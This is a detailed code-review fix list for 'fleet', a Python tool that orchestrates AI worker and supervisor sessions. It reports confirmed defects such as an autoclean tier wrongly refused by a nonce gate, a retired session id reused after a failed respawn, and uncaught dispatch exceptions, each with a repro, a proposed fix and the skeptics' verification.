# Ultrareview 2026-07-30 — priority fix list

**Status: OPEN. This is a priority queue, not a report to file away.**
Work it top-down. Every item carries its own verification verdict; nothing here is a style note.

## What produced this

A 133-agent adversarial review of the whole repo, run 2026-07-30 against `main` at `d019066`
(working tree clean except `supervisor/JOURNAL.md`).

- **14 dimension finders** swept, in parallel: locking/atomicity, the views doctrine, registry
  corruption/quarantine, mailbox delivery, the native substrate, the supervisor claim + nonce gate,
  handoff/incarnation lifecycle, usage-limit + timezone math, destructive-action guards,
  subprocess/injection surface, CLI + error paths, hooks + statusline, test-suite integrity, doc/spec drift.
- **Adversarial verification**: each finder's top findings went to **two independent skeptics** with
  distinct lenses (*reachability* — is this path real; *technical correctness* — did the reviewer read the
  code right, and can the claim be proven by running something). Both were instructed to default to
  *refuted* under uncertainty. A finding is CONFIRMED only if **neither** skeptic could refute it.
- **A completeness critic** then named territory the sweep missed; follow-up finders swept those gaps.

Totals: **69 findings raised → 27 CONFIRMED, 23 REFUTED, 19 UNVERIFIED.** 100 verification verdicts.

### Test baseline at the time of review

Both interpreters green, identical counts — the declared 3.10 floor genuinely holds:

- `py -3.13 -m pytest -q` → **2811 passed, 14 skipped** (204 s) — 2825 total, matching
  `--collect-only`'s 2825 exactly.

**Every defect below is invisible to that green suite.** That is the most important fact in this document:
2811 passing tests did not catch a supervisor-tier auth bypass, a mailbox that loses records on Windows,
or a `--token-ceiling` that is off by 17x.

**An anomaly found while establishing this baseline, worth someone's attention.** The first two baseline
runs were launched *concurrently* (3.10 and 3.13 against the same working tree at the same time). Both
reported **2577 passed, 13 skipped = 2590** — identically, and both exited 0. A single uncontended run
reports 2825, which is what collection reports. So **235 tests silently did not run, on both
interpreters, with a green exit code and no "deselected" in the summary.** The cause was not chased. It
is either a real fragility in the suite under concurrent execution against a shared working tree, or an
artifact of how those two runs were launched — but a suite that can report 2590/green when it collects
2825 is worth ten minutes of somebody's time, because "green" is the signal every gate in this repo
leans on. The 3.10 floor was verified green in the earlier (contended) run only; **a clean uncontended
3.10 run is still owed.**

### Known limits of this review — read before trusting a gap

- Only the **top 4 findings per dimension** were sent to verification. Lower-ranked findings are in P3,
  unvetted — some are probably wrong.
- The two follow-up sweep groups (`sweep/supervisor-journal-and-postcompact`,
  `sweep/token-ceiling-three-measures`) lost **all** of their verifiers to a mid-run auth expiry. Their 10
  findings are UNVERIFIED, including two rated critical.
- Three further sweeps never ran at all — `fleet-index-subsystem`, `wait-verb-ungated-unbounded`,
  `receipt-executor-unsandboxed`. **That territory is unreviewed.**
- No finding here was fixed. Nothing was committed. Line numbers are as of `d019066`.

### Overlap with work already tracked — do NOT open new lanes for these

The review ran blind to this repo's own queue, so three items are rediscoveries. That they were found
independently is corroboration, not new work:

- **P0-1** (`fleet autoclean`'s §7 exemption is documented but its archive tier is gated and always fails)
  is the **`acgate`** lane — queue item 3 in `docs/NEXT-SESSION.md`, and the open operator gate at
  `docs/OPERATOR-GATES.md:18`. That gate's own text already names the same "live R2 violation" this
  review's receipt reproduces: `autoclean --help` has no `--nonce`, so the remedy its refusal names is
  unreachable. **This is awaiting an operator ruling on how §7 gets disambiguated — it is not a
  builder-ready fix.** The review adds a fresh end-to-end receipt, nothing more.
- **P1-6, P1-7, P1-12, P1-13, P2-8** (the quarantine / `doctor --repair` / "not initialized" cluster) sit
  on top of the **`fleet.json.corrupt.*` glob gate**, which `docs/OPERATOR-GATES.md:34` records as
  *"owed work on `main`, not a closed item"* after the merge-now ruling of 2026-07-27. Fix the glob gate
  first; several of these collapse into it.
- **P3-18** (README badge says 2022 tests, suite collects 2825) — **the reviewer is right.** A clean run
  is 2811 passed + 14 skipped = 2825, matching collection. The badge at `README.md:5` understates the
  suite by 803 tests. This is the one item in P3 that needs no triage: it is measured, and the fix is a
  one-character-class edit to a badge URL.

---

## Themes — the repeated mistakes, worth more than any single line fix

Written by the orchestrating session from the 27 confirmed findings, not by a finder. Individual fixes
close individual holes; these are the patterns that will keep producing new ones.

1. **The diagnostic layer reports success it did not achieve.** `doctor --repair` prints *"has been
   quarantined"* on a branch that never attempts the rename (P1-7, P2-8); `doctor` PASSes and exits 0 on
   an absent registry, calling a nonexistent path *"readable"* (P1-12); `_quarantine_registry` swallows
   every rename failure and returns the path as though it worked (P1-2 territory); the statusline renders
   a just-quarantined fleet as *"not initialized"* (P1-13). **Five confirmed findings in one cluster, all
   the same shape: the component whose entire job is to tell the operator the truth about state is the
   component that lies.** This is the highest-leverage theme in the document, because every other gate in
   this repo is read through those verbs.

2. **Guards that name a remedy the caller cannot reach.** `autoclean`'s refusal says *"present
   `--nonce`"* and `autoclean --help` has no such flag (P0-1). `--retire-all`'s HANDSHAKE refusal names a
   `sup-handoff-complete` that is guaranteed to refuse (P2-4). `doctor` calls orphaned `*.claimed.*`
   files *"safe to remove"* and points at `fleet clean`, which never sweeps them (P2-7 cluster). This
   repo already has a rule against exactly this — the 2026-07-26 **R2** ruling — and it is being violated
   in at least three shipped places. **R2 has no lint. That is why.**

3. **Windows-only correctness debt in a Windows-first tool.** `validate_name` accepts `con`/`nul`/`aux`/
   `com1` (P1-8) and so does the PostCompact hook's `_valid_token` (P3-4), silently voiding task files,
   journals and outcomes. `resolve_claude_executable` leans on `shutil.which`, which prefers a
   `claude.cmd` in the **current directory** (P1-9) — a worker's cwd is attacker-influenced in exactly
   the way that matters. Unquoted paths break the statusline and every supervisor handoff if
   `FLEET_HOME` contains a space (P2-1, P2-5, P2-10). Text-mode appends lose whole records (P1-5). **The
   platform the tool primarily runs on is the platform its edge cases were never driven on.**

4. **Rollback paths more dangerous than the failure they handle.** `send`'s fork-steer rollback restores
   `idle` after a join-expiry that specifically means a live session exists, licensing a double-fork
   (P2-9). `finalize_mailbox_claim` swallows only `FileNotFoundError`, so any other `OSError` rolls back
   a launch that actually succeeded (P1-4). `respawn` commits a record built from a lock-free pre-probe
   snapshot, erasing a concurrent fork-steer's live sid (P1-3). `restore_mailbox_claim` does an unlocked
   read-truncate-write of the live mailbox (P2-7). **Every one of these is error-handling code, and every
   one of them is worse than doing nothing.**

5. **One contract, two counters, no reconciliation.** `--token-ceiling N` is enforced by the Stop hook
   (which sums every usage record) and by fleet (which sums one per turn) — **~17x apart**, so the hook
   halts a worker while `send` reports success (P3-5, P3-2). `respawn` zeroes the hook-side counter and
   never the fleet-side one, splitting them permanently (P3-6). The same shape appears in the statusline's
   `N bodies` alarm counting stale husks, so the one reserved red alarm is permanently lit (P3 cluster).

6. **The spec of record drifted in *both* directions.** Docs describe retired features as shipping
   (`fleet init --autoclean` in three places, a scheduler adapter seam that no longer exists), *and*
   `terminal-surface.md` D4 still asserts that shipped code violates D4 in six places when it no longer
   does (P1-11, P2-2, P2-11, P2-3). A doc that under-claims the code is not harmless: it is what made the
   `CLAUDE.md` doctrine paragraph need its long CURRENT-STATE hedge.

7. **The meta-layer that guards the invariants is itself unpinned.** `test_doctrine_is_not_restated_
   unqualified_while_it_is_false` cannot fail in either branch (P1 tests-quality). `_WRITE_RE` in the
   retired-sid citation pin only matches `x["retired_sids"] =`, so an `.append()`/`.update()` writer is
   invisible to it (P3). The scheduler-retirement lint only rejects lines containing both `(` and `=`, so
   a bare `schtasks` call sails through (P3). **This repo's central safety practice is "pin it with a
   test"; these are pins that hold nothing, and they read as protection in every review that cites them.**

---

## Index

| ID | Sev | Location | Finding |
|----|-----|----------|---------|
| P0-1 | crit | `skills/fleet/SKILL.md:25` | Docs claim `fleet autoclean` is exempt from the §7 claim gate; its archive tier is gate... |
| P0-2 | crit | `bin/fleet.py:9417` | _fast_completion_sid can return a RETIRED session's sid, silently re-binding a respawn ... |
| P1-1 | high | `bin/fleet.py:4969` | NativeDispatchError escapes main() as a raw traceback from send / resume-limited / sup-... |
| P1-2 | high | `bin/fleet.py:5484` | respawn commits a record built from a lock-free pre-probe snapshot, erasing a concurren... |
| P1-3 | high | `commands/doctor.md:3` | `allowed-tools: Bash(fleet doctor:*)` pre-authorizes `fleet doctor --repair`, the sole ... |
| P1-4 | high | `bin/fleet.py:12916` | sup-release drops handoff_pending + handoff_token_hash: an in-flight successor is erased |
| P1-5 | high | `bin/fleet.py:1237` | Mailbox appends use the buffered open(...,"a") this repo proved loses records on Window... |
| P1-6 | high | `bin/fleet.py:6030` | `fleet kill`/`fleet respawn` on a corrupt registry quarantine it lock-free, then report... |
| P1-7 | high | `bin/fleet.py:9039` | `fleet doctor --repair` reports "has been quarantined" on the branch that never attempt... |
| P1-8 | high | `bin/fleet.py:606` | validate_name accepts Windows reserved device names (con/nul/aux/com1…): task file, jou... |
| P1-9 | high | `bin/fleet.py:1342` | resolve_claude_executable uses shutil.which, which prefers `claude.cmd` in the CURRENT ... |
| P1-10 | high | `bin/fleet.py:6779` | `fleet clean` deletes the sup-release tombstone and re-arms the B6 wedge, deadlocking t... |
| P1-11 | high | `docs/specs/terminal-surface.md:68` | terminal-surface.md D4 still asserts shipped code VIOLATES D4 in 6 places; it no longer... |
| P1-12 | high | `bin/fleet.py:9036` | doctor PASSes and exits 0 on a quarantined (absent) registry, calling a nonexistent pat... |
| P1-13 | high | `bin/fleet.py:2988` | Statusline and /fleet:status render a just-quarantined fleet as "not initialized" |
| P1-14 | high | `commands/doctor.md:3` | Read-only /fleet:doctor and /fleet:overview pre-approve `fleet doctor --repair`, the so... |
| P2-1 | medi | `bin/fleet.py:3668` | `fleet init --statusline` writes an unquoted command; a space in the python or fleet pa... |
| P2-2 | medi | `docs/specs/terminal-surface.md:68` | terminal-surface.md D4/invariant-6 still assert views quarantine and take fleet.lock — ... |
| P2-3 | medi | `skills/fleet/SKILL.md:51` | SKILL.md tells the manager to install/uninstall the sweep via `fleet init --autoclean`,... |
| P2-4 | medi | `bin/fleet.py:14222` | --retire-all's HANDSHAKE refusal names a sup-handoff-complete that is guaranteed to ref... |
| P2-5 | medi | `bin/fleet.py:3670` | `fleet init --statusline` writes an unquoted shell command; a space in the Python or re... |
| P2-6 | medi | `bin/fleet.py:7986` | doctor's hook checks never verify the baked interpreter exists, so a Python upgrade sil... |
| P2-7 | medi | `bin/fleet.py:1218` | restore_mailbox_claim read-modify-writes the live mailbox, destroying a concurrently ap... |
| P2-8 | medi | `bin/fleet.py:9038` | `fleet doctor --repair` reports "has been quarantined" when nothing was quarantined |
| P2-9 | medi | `bin/fleet.py:4855` | send's fork-steer rollback restores `idle` after a join-expiry that means a live sessio... |
| P2-10 | medi | `bin/fleet.py:13625` | _render_successor_task renders fleet.py UNQUOTED — a space in FLEET_HOME wedges every s... |
| P2-11 | medi | `docs/specs/terminal-surface.md:70` | terminal-surface.md, the D4 spec of record, still asserts the pre-fix behaviour as curr... |
| P3-1 | crit | `bin/fleet.py:11608` | sup-boot commits the claim, then crashes before printing the one-copy NONCE if GOALS.md... |
| P3-2 | crit | `bin/fleet.py:1514` | --token-ceiling is inert fleet-side: _native_cumulative_tokens counts ~1/17th of real u... |
| P3-3 | high | `bin/fleet.py:11103` | supervisor_journal_append interpolates `sid` into the entry header unvalidated, defeati... |
| P3-4 | high | `bin/hooks/postcompact_journal.py:30` | PostCompact hook's _valid_token accepts Windows reserved device names; a worker named `... |
| P3-5 | high | `bin/hooks/stop_mailbox.py:118` | The same --token-ceiling N is enforced by two counters 16.7x apart; the hook halts the ... |
| P3-6 | high | `bin/fleet.py:5597` | respawn zeroes the hook-side ceiling counter but never the fleet-side one, permanently ... |
| P3-7 | medi | `docs/getting-started.md:143` | getting-started.md tells new operators to `fleet init --autoclean` and claims staleness... |
| P3-8 | medi | `docs/specs/three-tier-command.md:791` | three-tier-command.md §6.1/§6.2/§9.1 direct a builder to a scheduler adapter seam that ... |
| P3-9 | medi | `bin/fleet.py:13362` | _warn_missing_bypass_ack crashes sup-spawn on an undecodable GOALS.md, contradicting it... |
| P3-10 | medi | `bin/fleet.py:5510` | Failed respawn deletes the old sid's ceiling file before dispatch and never restores it... |
| P3-11 | medi | `bin/fleet.py:1511` | _native_cumulative_tokens omits the sid-keyed outcome fallback the same file exists to ... |
| P3-12 | medi | `bin/fleet.py:16063` | --token-ceiling 0 or negative is accepted and bricks the worker at spawn |
| P3-13 | low | `docs/SPEC.md:279` | SPEC.md and CLAUDE.md state views 'never probe anything live' while /fleet:doctor spawn... |
| P3-14 | low | `docs/specs/terminal-surface.md:182` | terminal-surface.md claims the statusline is "< 20 ms ... Asserted by test"; no such te... |
| P3-15 | low | `bin/fleet_statusline.py:222` | Statusline picks the lexicographically smallest HH:MM, not the earliest reset |
| P3-16 | low | `bin/fleet.py:5175` | A failed resume aborts the sweep and suppresses the report of workers already resumed |
| P3-17 | low | `bin/fleet.py:435` | A short atomic append leaves an unterminated line, silently swallowing the NEXT complet... |
| P3-18 | low | `README.md:5` | README test badge claims 2022 passing; the suite collects 2825 |
| P3-19 | low | `skills/fleet/SKILL.md:51` | skills/fleet/SKILL.md documents `fleet init --autoclean` flags that were removed |

Refuted findings are recorded in the appendix as `R1`-`R23`.

---

## P0 — CONFIRMED critical (2)

Fix before the next campaign runs.

### P0-1 — Docs claim `fleet autoclean` is exempt from the §7 claim gate; its archive tier is gated and always fails

- **Severity:** critical  |  **Verdict:** CONFIRMED  |  **Dimension:** `docs-drift`  |  **Category:** doc-asserts-safety-property-code-lacks
- **Location:** `skills/fleet/SKILL.md:25`

**What is wrong**

Four places assert the exemption as a shipped property:

- `skills/fleet/SKILL.md:25` — "Then **`fleet autoclean`** … It is structurally exempt from §7's claim gate, so it needs no `--nonce` even while a supervisor holds one."
- `skills/fleet/supervisor.md:88` — "`autoclean` is structurally exempt from §7's claim gate, so it needs no `--nonce` from either caller."
- `docs/specs/autoclean.md:52` — "`fleet autoclean` remains structurally exempt from §7's claim gate, which is now load-bearing rather than incidental: both new callers are sessions WITH a session id, so an exemption that had rested on 'the scheduled task has no sid' would have silently gated the sweep behind the very claim it exists to clean up around."
- `bin/fleet.py:11955-11962` (the gate's own docstring) — "`autoclean`'s exemption does NOT depend on that clause and never did: the verb is simply not wired to call this function (§7)."

The code contradicts all four. `bin/fleet.py:7805-7806`:
```
archive_args = argparse.Namespace(name=None, ttl_hours=ttl_hours, dry_run=dry_run)
archive_rc = cmd_archive(archive_args, run=run, which=which)
```
and `bin/fleet.py:7371` (top of `cmd_archive`):
```
_supervisor_gate("archive", nonce=getattr(args, "nonce", None))
```
The namespace autoclean builds carries no `nonce`, so the gate is entered with `nonce=None`. `fleet autoclean` also has no `--nonce` flag at all (`py -3.13 bin/fleet.py autoclean --help` → `--dry-run --expire-tombstones-hours --fleet-home --ttl-hours`), so a session-bearing caller has no way to satisfy it. `cmd_autoclean`'s tier isolation (`except Exception` at :7811) swallows the refusal into an error line and the run continues, exit 1.

Measured at HEAD `d019066` in a throwaway FLEET_HOME with a held, fresh claim, run as the CLAIM HOLDER's own sid:
```
$ CLAUDE_CODE_SESSION_ID=<holder sid> FLEET_HOME=$P py -3.13 bin/fleet.py autoclean
autoclean: archive tier failed: archive: refusing -- a supervisor claim (inc-20260728T000000Z-abcd) is held and fresh, and this call did not prove continuity on it (claim-nonce §7). Present the current generation with `--nonce <value>` …
autoclean: husks_removed=0 husks_deferred=0 tombstones_expired=0 errors=1
```
`docs/NEXT-SESSION.md:100-102` already names this defect ("The exemption is not transitive … `bin/fleet.py:7371`") and queues the fix as branch `acgate` (item 3), i.e. it is not on `main` — yet the four docs above still state the exemption as fact.

**Failure scenario**

A supervisor holds the claim with a fresh heartbeat (the normal state during any campaign). On its watchtower beat (`skills/fleet/supervisor.md:73`) it runs `fleet autoclean`. Tier 1 — the archive TTL pass, the whole reason the sweep exists — is refused by `_supervisor_gate("archive")`, caught by tier isolation, and reported as one stderr line. Every subsequent beat repeats it. The interface's startup ritual (`skills/fleet/SKILL.md:25`) hits the same refusal. Net effect: idle/dead/interrupted workers are NEVER archived for as long as a supervisor is alive — precisely the window the retired timer used to cover — while both the skill and the spec tell the operator the sweep needs no `--nonce` and is running.

**Fix**

Either (a) make the exemption real by giving the delegated call an explicit bypass — e.g. have `cmd_autoclean` call an ungated `_archive_pass(...)` core that `cmd_archive` wraps with `_supervisor_gate`, so the gate stays on the operator-facing verb only; or (b) if the gate is intended to apply, delete the four "structurally exempt" claims and give `fleet autoclean` a `--nonce` flag it forwards into `archive_args`. Do not leave the docs asserting (a) while the code does (b).

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I could not refute this; I reproduced it. (1) Control flow is exactly as described: bin/fleet.py:7807 builds argparse.Namespace(name=None, ttl_hours=..., dry_run=...) with no `nonce` attribute and calls cmd_archive, whose first statement (bin/fleet.py:7373) is `_supervisor_gate("archive", nonce=getattr(args, "nonce", None))` -> nonce=None. (2) I read _supervisor_gate in full (bin/fleet.py:11928-12122). Its disarming conditions are: no CLAUDE_CODE_SESSION_ID, no claim, cleanly-released claim, stale/unreadable heartbeat, legacy claim, a validating nonce, or the send-ONLY holder carve-out (`if verb == "send" and send_target is not None`). There is no autoclean carve-out and no holder-sid carve-out for `archive`, so being the claim holder's own session does NOT disarm it. (3) Live repro against the working tree (HEAD b7c5c85, only supervisor/JOURNAL.md modified), throwaway FLEET_HOME, held claim with a 5-second-old heartbeat and a real nonce_hash, roster stubbed, CLAUDE_CODE_SESSION_ID set to the claim's OWN session_id: `fleet.main(["autoclean"])` printed "autoclean: archive tier failed: archive: refusing -- a supervisor claim (inc-me) is held and fresh..." then "errors=1" and returned exit 1. Tier isolation at bin/fleet.py:7815 (`except Exception`) swallows it into one stderr line exactly as claimed. (4) `py -3.13 bin/fleet.py autoclean --help` shows only --ttl-hours/--expire-tombstones-hours/--dry-run/--fleet-home: no --nonce, so a sid-bearing caller has no route to satisfy the gate. (5) No existing test covers this. tests/test_autoclean.py:747 is `assert "_supervisor_gate" not in inspect.getsource(fleet.cmd_autoclean)` -- a source-string check on one frame that structurally cannot observe the delegated call, so it stays green while the behavior is broken. tests/test_gate_arm_wedge.py:287 even states the truth in a comment ("cmd_autoclean routes its first tier through cmd_archive, which IS gated") but its assertion only drives the no-sid path (monkeypatch.delenv CLAUDE_CODE_SESSION_ID), which is the one case that was never in question. (6) All four doc assertions are present in the tree as quoted (skills/fleet/SKILL.md:25, skills/fleet/supervisor.md:88, docs/specs/autoclean.md:52, bin/fleet.py:11957-11966), plus a fifth at skills/fleet/SKILL.md:65. No Windows/POSIX or stdlib subtlety is involved -- getattr on a Namespace lacking the attribute returns the None default, and that is the whole mechanism.
- *(confidence: high)* I could not refute this on the reachability lens; I reproduced it at current HEAD b7c5c85 (the finding measured d019066). cmd_autoclean (bin/fleet.py:7805-7806) builds an argparse.Namespace with no `nonce` and calls cmd_archive, whose first statement is _supervisor_gate("archive", nonce=getattr(args,"nonce",None)) at bin/fleet.py:7371 — unconditional, no upstream guard, not dead code. The gate arms on ANY sid-bearing caller (current_caller_session, bin/fleet.py:888-896, reads CLAUDE_CODE_SESSION_ID); holding the claim's own sid does not disarm it (only the verb=="send" record-identity carve-out at :12090 does), and _nonce_presentation(claim, None) returns None. Reachability confirmed empirically: this very Claude Code session has CLAUDE_CODE_SESSION_ID set, so both documented callers (supervisor watchtower beat skills/fleet/supervisor.md:71-73, interface startup ritual skills/fleet/SKILL.md:25) are sid-bearing, and SUPERVISOR_CLAIM_STALE_SECONDS=3600 with a per-beat heartbeat makes "held+fresh" the normal campaign state. Repro in a throwaway FLEET_HOME with a crafted held/fresh claim, run as the holder's sid: "autoclean: archive tier failed: archive: refusing -- a supervisor claim (inc-test-0001) is held and fresh..." / errors=1 / exit 1. `fleet autoclean --help` confirms no --nonce flag. All the cited "structurally exempt" assertions are still present at HEAD. However the finding's impact clause is materially wrong, and the defect is already tracked in-repo.

---

### P0-2 — _fast_completion_sid can return a RETIRED session's sid, silently re-binding a respawn to the previous turn

- **Severity:** critical  |  **Verdict:** CONFIRMED  |  **Dimension:** `native-substrate`  |  **Category:** correctness/silent-failure
- **Location:** `bin/fleet.py:9417`

**What is wrong**

```python
    for rec in read_outcomes(name):          # 9417-9418  <-- NO sid / short-id filter
        _consider(rec)

    if short_id:                              # 9420
        for path in sorted(outcomes_dir().glob("*.jsonl")):
            if not path.stem.startswith(short_id):   # the sid-keyed branch IS prefix-filtered
                continue
```
`_consider` (9401-9415) accepts any record with `kind == "result"`, a non-empty `session_id`, and `ts >= since - OUTCOME_FRESH_SLACK_SECONDS` (5.0s). `read_outcomes(name)` with no `sid` argument returns EVERY record ever written to `state/outcomes/<name>.jsonl` — i.e. every previous session of that worker name (`read_outcomes` only filters by sid when `sid is not None`, 9200-9201). Every other consumer of the outcome store is sid-filtered (`has_fresh_outcome` 9213 passes `sid=sid`; `_await_attach` 9633 calls `read_outcomes(name, sid=sid)`); this is the one that is not.

Measured on this repo (temp FLEET_HOME, `bin/fleet.py` as-is):
```
outcomes/w1.jsonl: {"ts":"2026-07-28T12:00:00Z","session_id":"aaaaaaaa-1111-...","kind":"result"}
_fast_completion_sid("w1", "2026-07-28T12:00:03Z")                     -> aaaaaaaa-1111-2222-3333-444444444444
_fast_completion_sid("w1", "2026-07-28T12:00:03Z", short_id="bbbbbbbb") -> aaaaaaaa-1111-2222-3333-444444444444
```
The second line is the damning one: dispatch_bg raised join-expiry carrying the short id of the session it genuinely just launched (`bbbbbbbb`), and the helper still hands back the OLD sid. `tests/test_native.py:698-705` (`test_prefers_freshest_across_both_sources`) even encodes an unrelated `"session_id": "old-name-keyed"` in the name-keyed file as a legal candidate — the hole is pinned as behavior, so no test can catch it.

**Failure scenario**

Canonical supervisor loop: `fleet wait w1` (poll_interval 3.0s, bin/fleet.py:4400) returns the instant the Stop hook writes `outcomes/w1.jsonl` `{kind:"result", session_id: OLD}` at T. The supervisor immediately runs `fleet respawn w1 --task ...`; `_cmd_respawn_native` stamps `pre_claim_at = T+2s` (5504) so the freshness threshold is `T-3s` — the OLD record is inside the window. `dispatch_bg` then fails for any reason (daemon-wedge / `--bg` exit != 0 / 60s join expiry). The `except NativeDispatchError` handler at 5530 calls `_fast_completion_sid(name, pre_claim_at, short_id=...)`, gets OLD back, and commits `session_id=OLD, status="idle", turns=1` (5536-5546) into a record whose `retired_sids` already contains OLD (5497), prints `w1 <OLD> (native bg, fast completion before join)` and returns 0. Wrong outcomes, all of them: (a) a respawn that launched NOTHING is reported as success; (b) the record is now bound to a dead, already-retired session — `session_id` is simultaneously in `retired_sids`; (c) `recompute_worker_native` re-derives it as `idle` forever, because `has_fresh_outcome(name, OLD, last_dispatch_at)` matches that same 5s-old record, so nothing ever surfaces the corruption; (d) `fleet result w1` / `fleet peek w1` replay the PREVIOUS turn's answer as if it were the new task's, so an automated supervisor concludes the new task is done; (e) in the join-expiry variant the newly dispatched session (short id `bbbbbbbb`) really is live and is now an orphan nothing tracks or can kill by name. The same hole exists in `cmd_sup_spawn` (13536) and `cmd_spawn` (3889), where it needs a name whose outcome file survived (spawn's is normally cleared by `_remove_worker_files`, 6614).

**Fix**

Filter the candidate set in `_fast_completion_sid`: (1) when `short_id` is given, require `str(rec["session_id"]).startswith(short_id)` in `_consider` — the sid-keyed branch already enforces exactly this on the filename, the name-keyed branch must enforce it on the record; (2) add an `exclude_sids` parameter and have every caller pass the record's `retired_sids` plus (for respawn) `old_sid`, so a sid the registry has already retired can never be resurrected as "the session that just fast-completed"; (3) when `short_id` is None (no dispatch ever reached the daemon, e.g. `claude` not found / task-file write failure), return None outright — there is no session to have fast-completed.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I could not refute this. I re-read bin/fleet.py:9369-9441, 9184-9207, 5486-5565, 3872-3900, 9498-9510 and bin/hooks/stop_outcome.py:125-160,233 myself, and reproduced the exact reported behavior in an isolated temp FLEET_HOME with the unmodified file: _fast_completion_sid("w1", "2026-07-28T12:00:03Z", short_id="bbbbbbbb") returns the OLD sid aaaaaaaa-1111-... from the name-keyed outcomes/w1.jsonl. The reviewer read the control flow correctly: read_outcomes(name) with sid=None applies no session-id filter (9204-9205 is gated on `sid is not None`), _consider (9404-9417) gates only on kind=="result", non-empty session_id and ts >= since-5.0s, and the short_id prefix test at 9424 is applied to the FILENAME in the sid-keyed branch only, never to the record in the name-keyed branch. The caller at 5534-5555 commits fast_sid with only a `session_id is None` guard and no exclusion of old_sid/retired_sids, and 5500 has already put old_sid into retired_sids. The stale record is genuinely reachable: the Stop hook writes name-keyed (`key = _resolve_name(home, sid) or sid`, stop_outcome.py:233) whenever the registry already carries session_id==sid, i.e. the normal completed-turn case, and nothing on the respawn path truncates outcomes/<name>.jsonl (only _remove_worker_files at 6641 and the archive path at 6996 do). NativeDispatchError's own docstring (9502-9504) confirms short_id is None for missing-exe / task-file-write / dispatch-subprocess failure, so the "nothing launched" cases also reach the unfiltered name-keyed scan. The function's own docstring (9381-9384) concedes the name-keyed source is reachable only once the stamp landed, which makes the commit guard false — so for the pre-claim shape that branch can essentially only match a stale record. No existing test covers or contradicts it. Nothing platform-specific (Windows vs POSIX) changes this; _parse_iso/glob/startswith semantics all behave as assumed.
- *(confidence: high)* I tried to refute on reachability and could not for the respawn call site. Reproduced the mechanism directly: with only outcomes/w1.jsonl holding {"session_id":"aaaaaaaa-...","kind":"result","ts":T}, fleet._fast_completion_sid("w1", T+3s, short_id="bbbbbbbb") returns the OLD sid — the name-keyed loop at bin/fleet.py:9419-9420 applies no sid/short-id filter, while the short_id branch at 9422-9425 does. read_outcomes only filters by sid when sid is not None (9204-9205).  Reachability confirmed rather than refuted: (1) _roster_live_sids (11108-11130) excludes state=="done", so a session that finished a fraction of a second ago is NOT live and _cmd_respawn_native takes the non---force path (5453-5456), writing no tombstone and leaving the old kind:"result" record intact; (2) bin/hooks/stop_outcome.py:233 keys on `_resolve_name(home, sid) or sid`, so an established session's result really does land in outcomes/<name>.jsonl; (3) nothing in respawn clears that file (_remove_worker_files, 6606-6650, is reached only from cmd_clean); (4) pre_claim_at is stamped at 5501, so the window is "old turn finished within OUTCOME_FRESH_SLACK_SECONDS (5.0, line 9160) before the respawn's registry write" — precisely the `fleet wait w1 && fleet respawn w1 --task ...` shape (cmd_wait, 4467, and dispatch_bg's join-expiry raise at 9814-9817 does carry short_id, while returncode!=0 / unparseable-short-id raises carry short_id=None); (5) no downstream detector exists — every consumer uses the session_id ∪ retired_sids union (1943, 2404, 2542, 11393) so a session_id that is also retired is silently absorbed, and save_registry (869) validates nothing.  Two sub-claims in the finding ARE refutable, which narrows scope but does not kill it. First, tests/test_native.py:699-706 does not pin the hole: test_prefers_freshest_across_both_sources only asserts found == SID, and "old-name-keyed" both loses on ts and fails a startswith("aaaabbbb") check, so it passes unchanged under the proposed fix. Second, the two other cited call sites are effectively unreachable: cmd_sup_spawn mints a fresh sup|<launch_id>|boot name and refuses a collision (13508-13514) so no prior outcomes file can exist, and cmd_spawn's validate_name (3857) rejects an existing name while the only way to free a name — fleet clean — deletes outcome_path(name) (6641, 6838). Harm (e) is also not incremental: the join-expiry orphan exists whether or not the stale sid is returned, since the rollback path restores `before` (the old sid) anyway.

---

## P1 — CONFIRMED high (14)

Data loss, permanent wedges, silent wrong behavior, false safety reports.

### P1-1 — NativeDispatchError escapes main() as a raw traceback from send / resume-limited / sup-lifecycle steer

- **Severity:** high  |  **Verdict:** CONFIRMED  |  **Dimension:** `cli-errors`  |  **Category:** error-handling
- **Location:** `bin/fleet.py:4969`

**What is wrong**

`NativeDispatchError` is a plain `Exception` (bin/fleet.py:9496 `class NativeDispatchError(Exception):`), and main()'s only catch arm is:

```python
    except (FleetCliError, ClaudeNotFoundError, ValueError, FleetLockTimeout,
            UnsupportedPlatformError) as exc:
        print(f"fleet: {exc}", file=sys.stderr)
        return 1
```
(bin/fleet.py:15130-15133)

`cmd_spawn` (:3883), `cmd_respawn` (:5521) and `cmd_sup_spawn` (:13535) each wrap it (`raise FleetCliError(f"...: native spawn failed -- {exc}") from exc`). Three dispatch paths do NOT:

* `cmd_send` -> `_cmd_send_native`: the fork-steer's only handler is `except BaseException: ... raise` (bin/fleet.py:4855-4865), and `cmd_send` calls it bare at :4969 `return _cmd_send_native(args.name, message, run=run, which=which, sleep=sleep)` with no try/except anywhere in :4932-4970.
* `cmd_resume_limited` -> `_resume_one_limited` (:5113) -> `_resume_one_limited_native`, whose handler is again `except BaseException: ... raise` (:5011).
* `_steer_supervisor_release` (:6232-6235) catches only `except FleetCliError`, so a NativeDispatchError blows through the `kill supervisor` / `respawn supervisor` choreography.

Measured (py -3.13, cmd_send's pre-dispatch steps stubbed, `_cmd_send_native` raising the real daemon-unreachable message):
```
subclass of caught set: False
ESCAPED main(): NativeDispatchError --bg dispatch exited 1: background service never became reachable
```

**Failure scenario**

The Claude background daemon is wedged (the exact M-E scenario `_NATIVE_BG_UNREACHABLE_RE` at :9769 was written for). Operator runs `fleet send myworker "keep going"` against an idle worker. `dispatch_bg` raises `NativeDispatchError` carrying the long, carefully-written `NATIVE_DAEMON_WEDGE_REMEDY` text. Instead of `fleet: --bg dispatch exited 1: ... run `fleet doctor` ...` on stderr with exit 1, the operator gets a Python traceback with `fleet.NativeDispatchError:` and the remedy buried in it. Same for `fleet resume-limited` and for `fleet kill supervisor` (which additionally aborts the release choreography mid-flight rather than reporting a refusal). `FleetCliError`'s own docstring at :3222 promises "a clean one-line message, never a raw traceback"; that promise is broken on the three most operationally common failure paths. Also reachable with `claude` absent from PATH: `resolve_claude_executable` raises `ClaudeNotFoundError` (which main WOULD catch) but dispatch_bg re-wraps it into `NativeDispatchError` at :9673, converting a clean message into a traceback.

**Fix**

Wrap the two CLI entry points the same way spawn/respawn already do. In `cmd_send` (:4969):
```python
    try:
        return _cmd_send_native(args.name, message, run=run, which=which, sleep=sleep)
    except NativeDispatchError as exc:
        raise FleetCliError(f"{args.name}: native steer failed -- {exc}") from exc
```
